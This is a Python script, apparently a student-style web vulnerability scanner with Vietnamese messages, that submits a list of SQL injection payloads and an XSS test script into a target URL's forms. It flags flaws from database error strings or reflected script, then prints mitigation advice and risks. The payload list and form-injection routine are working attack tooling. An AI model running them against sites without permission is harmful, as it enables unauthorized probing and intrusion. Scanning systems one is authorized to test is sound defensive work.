import re
import sys
import requests
from termcolor import colored
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint
from datetime import datetime
import time
import os

def get_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def is_vulnerable(response):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
    }
    for error in errors:
        if error in response.content.decode().lower():
            return True
    return False

def scan_sql(url):
    print("____________________________________________________")
    print("                       Report                       ")
    print("____________________________________________________")
    print("The url is:", url)
    print("\nscanning for SQL Injection...")
    print("            .....")
    print("                   searching....")
    print("                                 Connecting!!!!!\n")
    for c in "\"'":
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)
        res = requests.get(new_url)
        if is_vulnerable(res):
            print("[+] Phát hiện nguy cơ SQL Injection, link:", new_url)
            print("\n\n____________________________________________________")
            print("                       Mitigation                     ")
            print("____________________________________________________")
            print("You Must check the following:")
            print("1. Input validation")
            print("2. Parametrized queries")
            print("3. Stored procedures")
            print("4. Escaping")
            print("5. Avoiding administrative privileges")
            print("6. Web application firewall")
            print("____________________________________________________")
            now = datetime.now()
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            print("\nScanned at =", dt_string)
            return
    forms = get_forms(url)
    found = False
    print(f"[+] Phát hiện {len(forms)} forms trên {url}.")
    payloads = [
        "' OR 1=1; --",
        "' OR '1'='1",
        "' or",
        "-- or",
        "' OR '1",
        "' OR 1 - - -",
        " OR ""= ",
        " OR 1 = 1 - - -",
        "' OR '' = '",
        "1' ORDER BY 1--+",
        "1' ORDER BY 2--+",
        "1' ORDER BY 3--+",
        "1' ORDER BY 1, 2--+",
        "1' ORDER BY 1, 2, 3--+",
        "1' GROUP BY 1, 2, --+",
        "1' GROUP BY 1, 2, 3--+",
        "' GROUP BY columnnames having 1= 1 - -",
        "-1' UNION SELECT 1, 2, 3--+",
        "OR 1 = 1",
        "OR 1 = 0",
        "OR 1= 1#",
        "OR 1 = 0#",
        "OR 1 = 1--",
        "OR 1= 0--",
        "HAVING 1 = 1",
        "HAVING 1= 0",
        "AND 1= 1",
        "AND 1= 0",
        "AND 1 = 1--",
        "AND 1 = 0--",
        "AND 1= 1#",
        "AND 1= 0#",
        "AND 1 = 1 AND '%' ='",
        "AND 1 = 0 AND '%' ='",
        "WHERE 1= 1 AND 1 = 1",
        "WHERE 1 = 1 AND 1 = 0",
        "WHERE 1 = 1 AND 1 = 1#",
        "WHERE 1 = 1 AND 1 = 0#",
        "WHERE 1 = 1 AND 1 = 1--",
        "WHERE 1 = 1 AND 1 = 0--",
        "ORDER BY 1--",
    ]
    for form in forms:
        form_details = get_details(form)
        for payload in payloads:
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["type"] == "hidden" or input_tag["value"]:
                    try:
                        data[input_tag["name"]] = input_tag["value"]
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = payload
            req_url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = requests.post(req_url, data=data)
                if str(res.url) != str(url) and str(res.url) != str(req_url):
                    found = True
                    print("[+] Phát hiện lỗ hổng SQL Injection, link:", url)
                    print("[+] Form:")
                    pprint(form_details)
                    print(f"[+] Value: {payload}")
            elif form_details["method"] == "get":
                res = requests.get(url, params=data)
            if is_vulnerable(res):
                found = True
                print("[+] Phát hiện nguy cơ SQL Injection, link:", url)
                print("[+] Form:")
                pprint(form_details)
                break
    if not found:
        print("Chưa tìm thấy lỗ hổng SQL Injection")

def scan_xss(url):
    print("Scanning for XSS...")
    forms = get_forms(url)
    js_script = "<script>alert('hi')</script>"
    is_vulnerable = False
    for form in forms:
        form_details = get_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        regex_pattern = r'"%s"' % re.escape(js_script)
        match = re.search(regex_pattern, content)
        if not match and js_script in content:
            print(f"[+] phát hiện lỗ hổng XSS trong  {url}")
            print("Chúng tôi cho rằng nó nằm ở form bên dưới khi chúng tôi inject đoạn script vào")
            pprint(form_details)
            is_vulnerable = True
            print("\n\n____________________________________________________")
            print("                       RISKS                            ")
            print("________________________________________________________")
            print("1. Dẫn đến những hành động không mong muốn của người dùng")
            print("2. Có thể bị tấn công deface")
            print("3. Có thể bị inject trojan vào web")
            print("____________________________________________________")
            now = datetime.now()
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            print("\nScanned at =", dt_string)
    if not is_vulnerable:
        print("Trình quét không tìm thấy lỗ hổng XSS")



def submit_form(form_details, url, value):
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def main():
    print("Enter URL to scan:")
    url = input()

    scan_sql(url)
    scan_xss(url)
    x = open("Report.txt", 'w', encoding='utf-8')
    sys.stdout = x
    scan_sql(url)
    scan_xss(url)

    x.close()
    exit()

if __name__ == "__main__":
    main()
